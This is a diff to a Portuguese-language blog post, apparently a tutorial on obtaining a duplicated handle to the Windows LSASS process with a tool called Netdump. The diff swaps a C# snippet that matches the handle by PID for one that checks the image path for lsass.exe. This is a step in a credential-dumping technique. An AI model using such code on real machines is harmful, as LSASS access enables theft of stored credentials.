@@ -463,12 +463,15 @@ E, finalmente! Temos um handle pro LSASS! Vamos pausar a execução do código e
 
 > Uma alternativa ao uso da API `QueryFullProcessImageName` seria de checar se o PID do `hDuplicate` é o mesmo que o do LSASS, ao invés de checar pelo path do executável.
 ```csharp
-Process[] localByName = Process.GetProcessesByName("lsass");
-int lsass_pid = localByName[0].Id;
-
-if (Netdump.Invokes.GetProcessId(hDuplicate) == lsass_pid)
+if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
 {
-	Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}");
+	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
+	{
+		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
+		{
+			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
+		}
+	}
 }
 ```
 {: .prompt-tip }
